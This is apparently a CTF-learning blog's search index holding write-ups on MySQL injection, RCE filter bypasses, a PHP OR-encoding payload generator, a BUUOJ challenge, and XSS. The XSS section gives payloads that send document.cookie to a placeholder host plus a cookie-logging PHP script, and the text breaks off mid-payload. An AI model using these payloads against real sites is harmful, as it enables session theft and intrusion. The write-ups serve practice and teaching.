<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Hello world!</title>
    <url>/2022/01/16/blog0000-hello-world/</url>
    <content><![CDATA[<h2 id="写在前面的一些话"><a href="#写在前面的一些话" class="headerlink" title="写在前面的一些话"></a>写在前面的一些话</h2><p>Welcome to my blog!</p>
<span id="more"></span>

<p>这里是whistleH的博客世界，开这个博客的最初目的是大一暑假学的东西太多太杂，希望自己搭一个博客来记录一下自己学习历程。</p>
]]></content>
      <tags>
        <tag>preface</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL注入的姿势</title>
    <url>/2021/11/12/blog0002-sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="一、联合查询"><a href="#一、联合查询" class="headerlink" title="一、联合查询"></a>一、联合查询</h2><h3 id="1、基本说明"><a href="#1、基本说明" class="headerlink" title="1、基本说明"></a>1、基本说明</h3><p>SQL注入中最经典的就是联合查询，先上经典三板斧</p>
<p>联合注入的手段还是很多的，但是都大同小异，主要还是从information_schema这个存放mysql信息的数据库下手。</p>
<span id="more"></span>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>爆破库名</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>爆破表名</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;&#123;table_name&#125;&#x27;</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>爆破列名</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;&#123;table_name&#125;&#x27;</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>爆破内容</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">select</span> group_concat(<span class="number">0x5c</span>,<span class="keyword">column</span>,<span class="number">0x5c</span>,<span class="keyword">column</span>) <span class="keyword">from</span> &#123;database_name&#125;.&#123;table_name&#125;</span><br></pre></td></tr></table></figure>

<p>联合查询是入门的SQL注入姿势，通常只有面对没有部署任何waf的Web才能奏效。</p>
<h3 id="2、补充"><a href="#2、补充" class="headerlink" title="2、补充"></a>2、补充</h3><p>在联合查询时，我们构造payload要注意让前一个查询语句没有查询结果。</p>
<p>这是在实际情况中，往往Web只会显示查询到的第一条信息，</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">union</span> ......</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">0</span> <span class="keyword">union</span></span><br></pre></td></tr></table></figure>

<p>这里我们可以清楚发现前者屏蔽了正常查询的结果，使得我们的payload注入结果能够正常显示。</p>
<h2 id="二、堆叠注入"><a href="#二、堆叠注入" class="headerlink" title="二、堆叠注入"></a>二、堆叠注入</h2><h3 id="1、说明"><a href="#1、说明" class="headerlink" title="1、说明"></a>1、说明</h3><p>堆叠注入的经典案例就是强网杯2019的“随便注”（XCTF和BUUOJ都有环境复现</p>
<p>大致的原理和RCE中的管道运算符注入一样。</p>
<h3 id="2、补充-1"><a href="#2、补充-1" class="headerlink" title="2、补充"></a>2、补充</h3><p>先上”随便注”的payload</p>
<p>这里过滤了select 和 prepare，后者大小写非常好绕过（不用正则还是太年轻</p>
<p>前者我们这里使用了设置变量的方法，成功绕过了select的注入问题</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="variable">@sql</span><span class="operator">=</span>concat(<span class="string">&#x27;sel&#x27;</span>,<span class="string">&#x27;ect * from `1919810931114514`&#x27;</span>);<span class="keyword">Prepare</span> uut <span class="keyword">from</span> <span class="variable">@sql</span>; <span class="keyword">execute</span> uut;  <span class="comment">-- - </span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ctf</category>
        <category>web</category>
        <category>sql</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web</tag>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>RCE中的绕过总结（持续更新中）</title>
    <url>/2021/09/14/blog0001-rce%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="一、空格绕过"><a href="#一、空格绕过" class="headerlink" title="一、空格绕过"></a>一、空格绕过</h2><h3 id="1、URL编码绕过"><a href="#1、URL编码绕过" class="headerlink" title="1、URL编码绕过"></a>1、URL编码绕过</h3><p>空格在URL编码中为%20</p>
<p>当空格被过滤时，我们可以使用%09（tab）或者%0a（回车）绕过</p>
<p>Attention : 使用%0a时考虑是代码执行还是命令执行,如PHP中调用system()函数，如果使用%0a无法实现效果]</p>
<span id="more"></span>

<h3 id="2、shell变量绕过"><a href="#2、shell变量绕过" class="headerlink" title="2、shell变量绕过"></a>2、shell变量绕过</h3><p>在Linux bash中，我们可以使用shell中预设的变量来绕过空格</p>
<p>如：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">tac$</span><span class="bash">&#123;IFS&#125;flag.php</span></span><br><span class="line"><span class="meta">tac$</span><span class="bash">IFS<span class="variable">$1flag</span>.php</span></span><br><span class="line"><span class="meta">tac$</span><span class="bash">IFS<span class="variable">$9flag</span>.php</span></span><br></pre></td></tr></table></figure>

<h3 id="3、其他特殊符号替代"><a href="#3、其他特殊符号替代" class="headerlink" title="3、其他特殊符号替代"></a>3、其他特殊符号替代</h3><p>当上述方法被禁止的时候，我们可以考虑使用shell特殊符号</p>
<p>如：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tac&lt;flag.php #代替 tac flag.php</span><br><span class="line">tac&lt;&gt;flag.php</span><br></pre></td></tr></table></figure>



<h2 id="二、敏感词绕过"><a href="#二、敏感词绕过" class="headerlink" title="二、敏感词绕过"></a>二、敏感词绕过</h2><h3 id="1、通配符绕过"><a href="#1、通配符绕过" class="headerlink" title="1、通配符绕过"></a>1、通配符绕过</h3><p>Linux bash常见的通配符：</p>
<ul>
<li>* ：匹配任意个字符</li>
<li>？：匹配单个字符</li>
</ul>
<p>如：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">绕过简单的敏感词，实现文件的打开操作</span></span><br><span class="line">tac fla*  #</span><br><span class="line">tac fla?.php  #</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">字母被过滤时</span></span><br><span class="line">???/????64 ????.??? </span><br><span class="line"><span class="meta">#</span><span class="bash">等价于实现了 bin/base64 flag.php</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">参考案例(题源 ctfshow web入门 55)</span></span><br><span class="line"><span class="meta">if(isset($</span><span class="bash">_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span></span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2、shell字符串拼接"><a href="#2、shell字符串拼接" class="headerlink" title="2、shell字符串拼接"></a>2、shell字符串拼接</h3><p>Linux中shell字符串是可以拼接的,并且不需要额外的运算符。</p>
<p>那么我们可以得到以下3条等价的语句。</p>
<p>需要注意的是，如果第3条语句没有加上${}的分隔，将会被系统认为是$ag，这样得不到正确的结果</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tac /flag.png</span><br><span class="line">a=ag.png;tac /fl$a</span><br><span class="line">a=ag.pn;tac /fl$&#123;a&#125;g</span><br></pre></td></tr></table></figure>

<p>有了以上的知识，我们可以构造更为简单的payload,我们不需要引入额外的shell变量，直接利用“”这样的空字符串来实现拼接</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tac /fl&quot;&quot;ag.png</span><br><span class="line">tac /fla&#x27;&#x27;g.png</span><br></pre></td></tr></table></figure>

<h3 id="3、shell反斜杠转义"><a href="#3、shell反斜杠转义" class="headerlink" title="3、shell反斜杠转义"></a>3、shell反斜杠转义</h3><p>shell中反斜杠是去除转移字符的特殊含义，这个与大多数的语言类似。</p>
<p>当反斜杠后接正常字符，在shell中相当于不处理。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 以下两个句子在shell测试，发现两者输出相同</span></span><br><span class="line">echo flag.php</span><br><span class="line">echo fla\g.php</span><br></pre></td></tr></table></figure>

<h3 id="3、管道运算符的运用"><a href="#3、管道运算符的运用" class="headerlink" title="3、管道运算符的运用"></a>3、管道运算符的运用</h3><p><a href="https://blog.csdn.net/weixin_43460822/article/details/101622147">Linux 的 管道运算符+%0a</a></p>
<h3 id="4、文件读取"><a href="#4、文件读取" class="headerlink" title="4、文件读取"></a>4、文件读取</h3><p><a href="https://blog.csdn.net/JC_xxx/article/details/108921607">Linux 的文件读取指令 + grep</a></p>
<h3 id="5、eval逃逸"><a href="#5、eval逃逸" class="headerlink" title="5、eval逃逸"></a>5、eval逃逸</h3><p>这个其实用处不是很大，大意如下，也就是将对c的过滤转移出去，这样可以在a上实现rce</p>
<p>（这个思路还是很有意思的，2021极客大挑战反弹shell那道题就可以利用类似的思路开两个端口来实现真正的反弹shell</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">post: </span><br><span class="line">c = <span class="keyword">eval</span>(<span class="variable">$_POST</span>[a]);</span><br><span class="line">a = system(<span class="string">&#x27;ls&#x27;</span>);    </span><br></pre></td></tr></table></figure>



<h2 id="三、位运算绕过"><a href="#三、位运算绕过" class="headerlink" title="三、位运算绕过"></a>三、位运算绕过</h2><p>当字母和数字被过滤的时候，我们有的时候也可以考虑用PHP字符串位运算绕过的形式。</p>
<p>在PHP中”abc”|”abc”会将两个字符串转成ASCII二进制形式，如0x616263|0x616263 = 0x616263 </p>
<p>例题ctfshow(web 41)：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>分析题目我们发现可以 | 运算符以及引号没有被过滤，因此我们可以选择使用位运算绕过。</p>
<p>我们要注意的是，如果我们只是将system(‘ls’)通过位运算实现，这样的话输出的结果只会是 system(‘ls’), PHP会在eval中计算得到的字符串，但是并不会执行这样的语句。等价于，eval执行的是echo(“system(‘ls’)”);</p>
<p>要在PHP中利用字符串实现调用函数。我们可以先做个小实验：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>,<span class="number">1</span>);            <span class="comment">//错误信息</span></span><br><span class="line">ini_set(<span class="string">&#x27;display_startup_errors&#x27;</span>,<span class="number">1</span>);    <span class="comment">//php启动错误信息</span></span><br><span class="line">error_reporting(-<span class="number">1</span>);                    <span class="comment">//打印出所有的 错误信息</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">customError</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span></span>)</span>&#123; </span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;b&gt;Error:&lt;/b&gt; [<span class="subst">$errno</span>] <span class="subst">$errstr</span>&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//set error handler</span></span><br><span class="line">set_error_handler(<span class="string">&quot;customError&quot;</span>);</span><br><span class="line"><span class="variable">$c</span> = (<span class="string">&#x27;system&#x27;</span>)(<span class="string">&#x27;ls&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$c</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$d</span> = <span class="string">&quot;(&#x27;\x13\x19\x13\x14\x05\x0d&#x27;|&#x27;\x60\x60\x60\x60\x60\x60&#x27;)(&#x27;\x0c\x13&#x27;|&#x27;\x60\x60&#x27;)&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$d</span>);&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>当利用eval执行时，$d从字符串变为执行语句（直观点的理解就是最外层的引号没了），等价于$c。</p>
<p>最后附上py脚本（如果只是一次的话，没必要生成文件，直接生成字典就行了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">formDictionary</span>():</span></span><br><span class="line">    ch_sum = []</span><br><span class="line">    <span class="comment">#找到符合条件的字符</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">        ch = <span class="built_in">chr</span>(i)</span><br><span class="line">        re1 = re.match(<span class="string">r&quot;[0-9]|[a-z]|[A-Z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-&quot;</span>,ch)</span><br><span class="line">        <span class="keyword">if</span>(re1 == <span class="literal">None</span>):</span><br><span class="line">            ch_sum.append(ch)</span><br><span class="line">    <span class="comment">#输出到文件中</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;dic.txt&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> fout:</span><br><span class="line">        result= []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> ch_sum:</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> ch_sum:</span><br><span class="line">                x = <span class="built_in">ord</span>(i)|<span class="built_in">ord</span>(j)</span><br><span class="line">                <span class="keyword">if</span>(x&gt;=<span class="number">32</span> <span class="keyword">and</span> x&lt;=<span class="number">126</span> <span class="keyword">and</span> (<span class="keyword">not</span> x <span class="keyword">in</span> result)):</span><br><span class="line">                    result.append(x)</span><br><span class="line">                    <span class="comment">#warning 这可能导致无法构造出\t</span></span><br><span class="line">                    fout.write(<span class="string">&quot;%&#123;:0&gt;2x&#125;\t%&#123;:0&gt;2x&#125;\t&#123;&#125;\n&quot;</span>.<span class="built_in">format</span>(<span class="built_in">ord</span>(i),<span class="built_in">ord</span>(j),<span class="built_in">chr</span>(x)))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">formStr</span>(<span class="params">s</span>):</span></span><br><span class="line">    s1=<span class="string">&quot;&quot;</span></span><br><span class="line">    s2=<span class="string">&quot;&quot;</span></span><br><span class="line">    dic = &#123;&#125;</span><br><span class="line">    <span class="comment">#读取文件</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;dic.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> fin:</span><br><span class="line">        <span class="keyword">for</span> lines <span class="keyword">in</span> fin:</span><br><span class="line">            elem = (lines.split(<span class="string">&#x27;\t&#x27;</span>))</span><br><span class="line">            dic[elem[-<span class="number">1</span>].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>)] = (elem[<span class="number">0</span>],elem[<span class="number">1</span>])</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">            <span class="keyword">if</span>(dic.get(i)!=<span class="literal">None</span>):</span><br><span class="line">                s1 += dic[i][<span class="number">0</span>]</span><br><span class="line">                s2 += dic[i][<span class="number">1</span>]</span><br><span class="line">               <span class="comment"># print(&quot;&#123;&#125; : &#123;&#125;|&#123;&#125;&quot;.format(i,dic[i][0],dic[i][1]))</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                sys.exit(<span class="string">&quot;No answer&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;(\&#x27;&quot;</span>+s1+<span class="string">&quot;\&#x27;|\&#x27;&quot;</span>+s2+<span class="string">&quot;\&#x27;)&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    formDictionary()</span><br><span class="line">    s0 = <span class="built_in">input</span>(<span class="string">&quot;function : &quot;</span>)</span><br><span class="line">    s1 = <span class="built_in">input</span>(<span class="string">&quot;argv : &quot;</span>)</span><br><span class="line">    s0_encode= formStr(s0)</span><br><span class="line">    s1_encode=formStr(s1)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(s0_encode+s1_encode)</span><br><span class="line">    data=&#123;</span><br><span class="line">       <span class="string">&#x27;c&#x27;</span>:urllib.parse.unquote(s0_encode+s1_encode)		<span class="comment">#注意使用quote</span></span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(url=<span class="string">&quot;http://your-domain/&quot;</span>,data=data)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>ctf</category>
        <category>web</category>
        <category>rce</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web</tag>
        <tag>rce</tag>
      </tags>
  </entry>
  <entry>
    <title>Buuoj WP(Web方向-1)</title>
    <url>/2021/11/22/blog0003-buuoj-web-wp-1/</url>
    <content><![CDATA[<h2 id="1、Roar-CTF-Easy-Calc"><a href="#1、Roar-CTF-Easy-Calc" class="headerlink" title="1、Roar-CTF Easy Calc"></a>1、Roar-CTF Easy Calc</h2><p>这题打开界面是一个计算表达式的网页</p>
<p>首先，检查前端代码，发现前端向后端 calc.php 发送数据部署了WAF</p>
<span id="more"></span>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    $(<span class="string">&#x27;#calc&#x27;</span>).submit(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        $.ajax(&#123;</span></span><br><span class="line"><span class="javascript">            <span class="attr">url</span>:<span class="string">&quot;calc.php?num=&quot;</span>+<span class="built_in">encodeURIComponent</span>($(<span class="string">&quot;#content&quot;</span>).val()),</span></span><br><span class="line"><span class="javascript">            <span class="attr">type</span>:<span class="string">&#x27;GET&#x27;</span>,</span></span><br><span class="line"><span class="javascript">            <span class="attr">success</span>:<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                $(<span class="string">&quot;#result&quot;</span>).html(<span class="string">`&lt;div class=&quot;alert alert-success&quot;&gt;</span></span></span><br><span class="line"><span class="string"><span class="javascript">            &lt;strong&gt;答案:&lt;/strong&gt;<span class="subst">$&#123;data&#125;</span></span></span></span><br><span class="line"><span class="string"><span class="javascript">            &lt;/div&gt;`</span>);</span></span><br><span class="line"><span class="javascript">            &#125;,</span></span><br><span class="line"><span class="javascript">            <span class="attr">error</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                alert(<span class="string">&quot;这啥?算不来!&quot;</span>);</span></span><br><span class="line"><span class="javascript">            &#125;</span></span><br><span class="line"><span class="javascript">        &#125;)</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="javascript">    &#125;)</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>打开calc.php，发现PHP代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">        <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>首先发送一个phpinfo()测试，发现返送回来一个403，看来是只能发送数字</p>
<h3 id="PHP请求参数解析漏洞"><a href="#PHP请求参数解析漏洞" class="headerlink" title="PHP请求参数解析漏洞"></a>PHP请求参数解析漏洞</h3><p>利用PHP的请求参数解析漏洞</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//node4.buuoj.cn:28838/calc.php?num=phpinfo()</span></span><br><span class="line">http:<span class="comment">//node4.buuoj.cn:28838/calc.php? num=phpinfo()</span></span><br></pre></td></tr></table></figure>

<p>当发送这两个变量时，都会在PHP内部解析为“num”变量（PHP解析时自动忽略前置空格）</p>
<p>因此我们利用这招绕过了url上的数字检查，达到PHP内部实现RCE</p>
<p>ban了这么多东西不要紧，我们还是可以利用PHP的内部函数来绕过</p>
<p>（PHP的原生函数在RCE受限的情况下还是非常有用的，用起来也需要一定的熟练度和脑洞）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">num=var_dump(scandir(chr(<span class="number">47</span>)))</span><br><span class="line">num=var_dump(readfile(chr(<span class="number">47</span>).chr(<span class="number">102</span>).chr(<span class="number">49</span>).chr(<span class="number">97</span>).chr(<span class="number">103</span>).chr(<span class="number">103</span>)))</span><br></pre></td></tr></table></figure>

<p>成功拿到flag</p>
<h3 id="HTTP请求走私"><a href="#HTTP请求走私" class="headerlink" title="HTTP请求走私"></a>HTTP请求走私</h3><p>我们当然也可以尝试使用HTTP请求走私的方法去绕过url的检查</p>
<p>参考wp:<a href="https://www.jianshu.com/p/d58a280ff753">https://www.jianshu.com/p/d58a280ff753</a></p>
<p>HTTP请求走私：<a href="https://xz.aliyun.com/t/6654#toc-1%5D">https://xz.aliyun.com/t/6654#toc-1%5D</a></p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>web</category>
        <category>wp</category>
        <category>php</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web</tag>
        <tag>buuoj</tag>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>HCTF-warmup-目录穿越</title>
    <url>/2022/01/16/blog0005-HCTF-warmup-%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/</url>
    <content><![CDATA[<h2 id="一、题目重点"><a href="#一、题目重点" class="headerlink" title="一、题目重点"></a>一、题目重点</h2><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/wp/LFIHCTF-LFI-wp.png" alt="题目图片"></p>
<p>我们首先来看一下</p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>web</category>
        <category>wp</category>
        <category>LFI</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web</tag>
        <tag>wp</tag>
        <tag>LFI</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow-xss-wp</title>
    <url>/2021/11/23/blog0004-ctfshow-xss-wp/</url>
    <content><![CDATA[<h2 id="一、写在前面"><a href="#一、写在前面" class="headerlink" title="一、写在前面"></a>一、写在前面</h2><p>之前一直在比赛遇到xss的题目，决定开始认真练习一下。</p>
<p>web这块不练习的话还是不太理解其中的trick（其实还是基础不扎实，只看理论知识的话一上手就懵逼</p>
<p>网上很多wp都是利用xss平台现成的payload和解析，这篇博客主要是用自己的VPS服务器打（也带了一些新手的探索吧。</p>
<span id="more"></span>

<p>反射型常见trick：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#python for temporary site</span></span><br><span class="line">python3 <span class="literal">-m</span> http.server &#123;port&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#PHP for store the http request</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$log</span> = fopen(<span class="string">&quot;cookie.txt&quot;</span>,<span class="string">&quot;a&quot;</span>);</span><br><span class="line">	fwrite(<span class="variable">$log</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>]);</span><br><span class="line">	fclose(<span class="variable">$log</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#来自一个刚刚接触服务器PHP的菜鸟碎碎念</span></span><br><span class="line"><span class="comment">#如果你没有在linux下开放写权限，PHP是无法打开上述相对路径的，fopen()返回false。</span></span><br><span class="line"><span class="comment">#当然你可以尝试/tmp/cookie.txt这样的绝对路径,但是没有开放权限的基础上，PHP会写入apache的一个临时目录下的/tmp/cookie.txt(试#试(find / -name &quot;cookie.txt&quot;)</span></span><br></pre></td></tr></table></figure>

<h2 id="反射型（Web316-Web326"><a href="#反射型（Web316-Web326" class="headerlink" title="反射型（Web316 - Web326)"></a>反射型（Web316 - Web326)</h2><p>反射型的XSS，一般就是打到cookie从而获取登录权限。</p>
<p>不过会有各种过滤</p>
<p>附上payload，一般都试试，如果过不去了可以试试其他banfa</p>
<p>xss平台：<a href="https://xss.pt/">https://xss.pt/</a></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//首先是经典的img</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">&quot;img&quot;</span>);</span><br><span class="line">	img.src = <span class="string">&quot;http://your-domain:port/&quot;</span>+<span class="built_in">document</span>.cookie;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">//location.href系列</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.open(<span class="string">&#x27;http://your-domain:port/&#x27;</span>+<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.location.href=<span class="string">&quot;http://your-domain:port&quot;</span>+<span class="built_in">document</span>.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">location.href=<span class="string">&quot;http://your-domain:port&quot;</span>+<span class="built_in">document</span>.cookie</span><span class="tag">&lt;/<span 